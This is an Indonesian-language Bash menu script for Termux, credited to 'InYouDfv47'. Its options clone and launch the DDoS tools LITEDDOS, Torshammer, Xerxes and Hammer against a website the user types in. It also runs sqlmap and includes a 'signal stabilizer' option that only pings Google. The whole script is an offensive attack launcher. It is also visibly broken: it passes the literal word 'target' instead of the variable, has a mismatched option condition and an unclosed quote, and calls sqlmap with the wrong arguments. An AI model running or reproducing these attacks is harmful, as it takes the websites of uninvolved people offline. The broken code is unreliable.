#!/system/xbin/bash
#Author InYouDfv47
#Selamat Belajar

clear
blue='\033[34;1m'
green='\033[32;1m'  
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'    

figlet Dfv47 | lolcat
echo $cyan"Membuat Tools Instaler Sendiri Di Termux"
echo $green"Daftar Toolsnya=>"
echo $purple"[1] DDOS Website Dengan LITEDDOS"
echo $purple"[2] DDOS Website Dengan Torshammer"
echo $purple"[3] DDOS Website Dengan Xerxes"
echo $purple"[4] DDOS Website Dengan Hammer"
echo $purple"[5] menstabilkan sinyal"
echo $purple"[6] sqlmap"
echo
echo $green
read -p "╭─[Pilih Nomer]
╰─root@Dfv47=•>" bro

if [ $bro = 1 ] || [ $bro = 1 ]
then
clear
echo $green"Installing LITEDDOS..."
sleep 1
apt update
apt install git
git clone https://github.com/4L13199/LITEDDOS
mv LITEDDOS $HOME
cd $HOME/LITEDDOS
read -p "MasukanTarget:" target
python2 LITEDDOS.py target 80 100
fi

if [ $bro = 2 ] || [ $bro = 2 ]
then
clear
echo $green"Installing.....
apt update
apt install git
git clone https://github.com/dotfighter/torshammer.git
mv torshammer $HOME
cd $HOME/torshammer
read -p "Masukan Target:" target
python2 torshammer.py -T -t target
fi

if [ $bro = 3 ] || [ $bro = 3 ]
then
clear
echo $green"Installing Xerxes DDOS..."
sleep 1
apt update && apt upgrade
apt install git
apt install clang
git clone https://github.com/zanyarjamal/xerxes
mv xerxes $HOME
cd $HOME/xerxes
clang xerxes.c -o xerxes
clear
read -p "[masukanWebsiteTarget]>" target
./xerxes target 80
fi

if [ $bro = 4 ] || [ $bro = 5 ]
then
clear
echo $green" Installing Hammer DDOS.."
sleep 1
git clone https://github.com/cyweb/hammer
mv hammer $HOME
cd $HOME/hammer
read -p "Masukan Target:" target
python2 hammer.py -T -t target
fi

if [ $bro = 5 ] || [ $bro = 5 ]
then
clear
figlet "Mr.B4J1N64N" | lolcat
sleep 1
echo "\033[32;m===================Mempercepat / menstabilkan sinyal 2===================="
sleep 1
echo "\033[32;1m================================By Mr.B4J1N64N================================"
sleep 1
echo ""
echo ""
ping -D www.google.com
fi

if [ $bro = 6 ] || [ $bro = 6 ]
then
clear
toilet -f standard -F gay "Mr.B4J1N64N"
apt update
apt install git
git clone https://github.com/sqlmapproject/sqlmap
mv sqlmap $HOME
cd $HOME/sqlmap
read -p "masukan web target:" target
python2 sqlmap.py -D target
fi